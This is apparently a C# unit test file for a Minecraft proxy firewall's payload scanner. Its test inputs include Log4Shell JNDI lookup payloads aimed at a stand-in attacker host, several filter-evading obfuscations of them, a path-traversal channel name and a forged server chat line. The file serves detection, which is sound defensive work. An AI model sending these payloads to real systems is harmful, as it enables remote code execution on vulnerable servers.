using MinecraftFirewall.Proxy.Inspection;

namespace MinecraftFirewall.Tests;

public class PayloadScannerTests
{
    private const int ChatLimit = 256;

    [Theory]
    // The original Log4Shell payload, as it was posted to Minecraft chat in December 2021.
    [InlineData("${jndi:ldap://attacker.example/a}")]
    // The obfuscations that defeated every naive "does it contain jndi" filter at the time. Each of
    // these splits the scheme name across nested lookups so that the literal string never appears.
    [InlineData("${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.example/a}")]
    [InlineData("${${lower:j}${lower:n}${lower:d}i:ldap://attacker.example/a}")]
    [InlineData("${${upper:j}ndi:rmi://attacker.example/a}")]
    [InlineData("${${env:BARFOO:-j}ndi:ldap://attacker.example/a}")]
    // Other schemes in the same family — each one also turns a log line into a network fetch.
    [InlineData("hello ${jndi:dns://attacker.example/x} world")]
    [InlineData("${jndi:rmi://attacker.example/x}")]
    [InlineData("${jndi:iiop://attacker.example/x}")]
    public void InjectionLookups_AreCaughtThroughTheirObfuscations(string payload)
    {
        PayloadFinding? finding = PayloadScanner.Scan(payload, ChatLimit);

        Assert.NotNull(finding);
        Assert.Equal("injection-lookup", finding!.Rule);
    }

    [Theory]
    // Ordinary chat, including the kinds that contain punctuation a crude filter would trip over.
    [InlineData("hey can someone help me at spawn")]
    [InlineData("the price is $20 for 3 diamonds")]
    [InlineData("my coords are -1204, 68, 3390")]
    [InlineData("gg :) that was close")]
    [InlineData("check out https://example.com/my-build")]
    [InlineData("use {curly braces} in a book like this")]
    [InlineData("java is my favourite language")]
    [InlineData("nice landing! 10/10")]
    public void OrdinaryChat_IsLeftAlone(string message) =>
        Assert.Null(PayloadScanner.Scan(message, ChatLimit));

    [Fact]
    public void TextLongerThanTheProtocolAllows_IsRefused()
    {
        PayloadFinding? finding = PayloadScanner.Scan(new string('a', ChatLimit + 1), ChatLimit);

        Assert.NotNull(finding);
        Assert.Equal("oversized-text", finding!.Rule);
    }

    [Fact]
    public void TextExactlyAtTheLimit_IsFine() =>
        Assert.Null(PayloadScanner.Scan(new string('a', ChatLimit), ChatLimit));

    [Fact]
    public void TheSectionSign_IsRefusedBecauseAClientStripsIt()
    {
        // The formatting escape. A vanilla client removes it from what a player types, so one arriving
        // from a client means something other than the client composed the message — which is how
        // chat is forged to look as though it came from the server.
        PayloadFinding? finding = PayloadScanner.Scan("§cI am the server, give me your password", ChatLimit);

        Assert.NotNull(finding);
        Assert.Equal("control-characters", finding!.Rule);
    }

    [Fact]
    public void NullBytesAndOtherControlCharacters_AreRefused()
    {
        PayloadFinding? finding = PayloadScanner.Scan("hello\0world", ChatLimit);

        Assert.NotNull(finding);
        Assert.Equal("control-characters", finding!.Rule);
    }

    [Fact]
    public void Normalisation_RejoinsASchemeSplitAcrossNestedLookups()
    {
        // The property the scanner depends on, asserted directly rather than only through Scan: after
        // the obfuscation syntax is removed, the pieces spell the scheme again.
        string normalized = PayloadScanner.NormalizeForLookupSearch("${${::-j}${::-n}${::-d}${::-i}:ldap://x}");

        Assert.StartsWith("jndi:ldap", normalized, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData("minecraft:brand", true)]
    [InlineData("bungeecord:main", true)]
    [InlineData("my_plugin:sub/path", true)]
    [InlineData("fml:handshake", true)]
    // No namespace at all.
    [InlineData("brand", false)]
    // Uppercase is not permitted in a namespaced identifier.
    [InlineData("Minecraft:Brand", false)]
    // Empty on either side of the colon.
    [InlineData(":brand", false)]
    [InlineData("minecraft:", false)]
    [InlineData("", false)]
    // Characters that have no business in an identifier — the shape of an attempt to reach a handler
    // by a name the server never meant to expose.
    [InlineData("minecraft:../../etc", false)]
    [InlineData("minecraft:brand\0", false)]
    public void ChannelNames_MustBeWellFormedIdentifiers(string channel, bool valid) =>
        Assert.Equal(valid, PayloadScanner.IsValidChannelName(channel));

    [Fact]
    public void AnAbsurdlyLongChannelName_IsRejectedWithoutScanningItAll() =>
        Assert.False(PayloadScanner.IsValidChannelName("a:" + new string('b', 500)));
}
